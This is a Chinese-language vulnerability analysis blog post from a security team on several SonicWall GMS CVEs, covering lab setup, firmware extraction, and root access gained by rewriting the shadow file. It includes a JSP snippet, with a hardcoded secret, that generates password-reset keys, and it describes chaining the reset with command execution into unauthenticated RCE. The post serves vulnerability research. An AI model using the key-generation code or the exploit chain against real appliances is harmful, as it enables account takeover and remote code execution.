#  SonicWall GMS 漏洞分析   
原创 badmonkey  ChaMd5安全团队   2023-11-13 08:44  
  
> 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱  
  
admin@chamd5.org(带上简历和想加入的小组  
  
  
  
- 环境配置  
  
- 固件提取  
  
- 漏洞定位  
  
- CVE-2023-34123  
  
- CVE-2023-34128  
  
- CVE-2023-34124  
  
- CVE-2023-34127  
  
- CVE-2023-34129  
  
- 后续  
  
## 环境配置  
  
进入后需要login，在login界面输入snwlcli，会尝试登录到cli中，在新的login中输入用户名 admin 口令 password进入后，进行网络配置  
```
interface eth0 192.168.1.203 255.255.255.0
route --add default --destination 192.168.1.1
exit

```  
  
以single server模式部署  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXSuM3XlEibJTyPzicGLlRY6hzQu7dVv6A81lektnvoa56lxKictFj2U2wg/640?wx_fmt=png "")  
  
image-20231106165154053  
## 固件提取  
  
使用diskgenius打开，主要关注两个文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXX8tu7vj2siazN4dGpyruLt6TCqEWNIza5ACx4MDgibSjSyfiaceuoIg5A/640?wx_fmt=png "")  
  
image-20231105203855124  
  
其中GMSVP对应着后端的处理逻辑，为ext2类型的文件系统，在wsl2挂载时出现问题，使用diskgenius也没办法正常打开，但是在ubuntu22.04可以正常挂载  
```
sudo mount -t ext2 GMSVP-image.ext2 opt

```  
  
但是也是没有ssh的，发现root.img为squashfs，尝试重新写root.img中的shadow文件，重新启动后失败。分析后发现conf.img也是squashfs，且保存了很多的配置内容，包括httpd等配置。因此重新打包conf.img，首先生成一个sha512的密码，明文为password  
```
sudo apt-get install whois
mkpasswd --method=sha512crypt

```  
  
参考https://www.anquanke.com/post/id/266078 进行vmdk的转换和挂载  
```
sudo modprobe nbd max_part=8 
sudo qemu-nbd --connect=/dev/nbd0 ./gms_1389.qcow2

```  
  
修改conf.img并重新打包  
```
unsquashfs conf.img
cd squashfs-root
vim shadow
mksquashfs squashfs-root fake.img
cp fake.img /media/xxxx/ROOT/00/conf.img
sudo qemu-nbd -d /dev/nbd0
qemu-img convert -f qcow2 gms_1389.qcow2 -O gms_1389.vmdk

```  
## 漏洞定位  
  
看了下官方公告  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXfMgGKDG1jXN707W4l3RuA9QPfWc30CVKkvWpct9bLfdDdgZJc92kuw/640?wx_fmt=png "")  
  
image-20231109134200386  
  
具体的细节为  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXQhAUlEhqwFDFl5ibUuRFCdrjq0IFvwytWWX13CrubFiaH3EKWEsYpPWA/640?wx_fmt=png "")  
  
image-20231109134711614  
### CVE-2023-34123  
  
由于是虚拟机，因此会进入这个条件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXEGibwMRYmUyib1Y78npezZ59fof6ycWoBj7wBcmqGhbtCbHVvWEAnYpg/640?wx_fmt=png "")  
  
image-20231109143713211  
  
对应的内容为  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXXohqgNmU4931djibv1LGphngcNiac2SmdSicOicz68vN19Oeegnd3W7shA/640?wx_fmt=png "")  
  
image-20231109143750492  
  
虽然每个机器的serial是不一样的，但是重置密码只用了前六位，而这前六位是一样的  
> cat /mnt/sysinfo/serial  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXuGF53SmEHfyHgnMyxWsHVK10l0CbiczQgiaS8eqUyQANl4v2dN9neJ1w/640?wx_fmt=png "")  
  
image-20231109143946550  
  
但是实际测试后发现,即使使用000C29068982生成resetkey也会有问题，**可能是因为复现环境没有license的原因？**但是使用password作为key可以进入reset流程，这里直接使用jsp进行key的生成,jsp位于/opt/GMSVP/Tomcat/webapps/sgms/test.jsp  
```
<%@ page import="com.sonicwall.sgms.util.Crypto" %>
<%@ page import="com.sonicwall.sgms.util.Base64" %>
<%

//String sn = "000C29068982";
String sn = (String)request.getParameter("sn");
String key = sn.substring(0, 6)+"d:&!4+O=*wQe~I8f3l";
String restKey;
String plaintext = (String)request.getParameter("pwd"); 
restKey = new String(Base64.encode(Crypto.encrypt3DES(key.getBytes(), plaintext.getBytes(), false,true)));
out.println(restKey);
// https://192.168.147.200/sgms/test.jsp?pwd=password&sn=password
// GfVnXHe62BkacZMdYLyBTQ==
%>

```  
  
使用该key进行密钥重置，在日志中可以看到如下信息，日志位于/opt/GMSVP/Logs/DbgAppliance0.log  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXYmsiaZnyr1ILzRCumBohJxrvzZ9Yhdxe0oakefbRicKFnw6CIWS4HQRA/640?wx_fmt=png "")  
  
image-20231110000317658  
### CVE-2023-34128  
  
tomcat manager使用硬编码，但是开启了ip限制所以没啥用?  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXcel7k7WXE9sG4OtzBYiatI8ibYlNyrpytzdyYKRg9GmhPbicL6xHUGraA/640?wx_fmt=png "")  
  
image-20231110110511349  
  
限制了环回地址  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXIctzCzjGQNvt8hwWlKBbYaOLAvB1bia09ClfwWJGOXXGoNXtbesoibzw/640?wx_fmt=png "")  
  
image-20231110110601909  
### CVE-2023-34124  
  
没有license没办法，没办法复现，没找到对应的接口。  
  
https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/sonicwall_shell_injection_cve_2023_34124.rb  
### CVE-2023-34127  
  
对文件进行筛选时，存在命令执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXbXoxlGvW5wTgBf1BK2icCic1FEKRIHJeQfrUiarUDItNMsUQGqXOEycAQ/640?wx_fmt=png "")  
  
image-20231110151845147  
### CVE-2023-34129  
  
路径穿越  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSInGvz3l7fkVibPgcicVGGIXqzPpAJG5mbXjU3V9NFJjoOfPrLTcG4wvAOWOca8bv1qK2CicnuYjKNg/640?wx_fmt=png "")  
  
image-20231110152020269  
## 后续  
  
其他的一些任意文件上传，硬编码没有贴出来，可以反编译成java后beyondcompare这里不在赘述，没找到CVE-2023-34131，结合resetPWD和授权的命令执行是可以未授权RCE的。泄露出serial number是可以重置密码，然后授权执行系统命令的。  
  
- END -  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBR8nk7RR7HefBINILy4PClwoEMzGCJovye9KIsEjCKwxlqcSFsGJSv3OtYIjmKpXzVyfzlqSicWwxQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
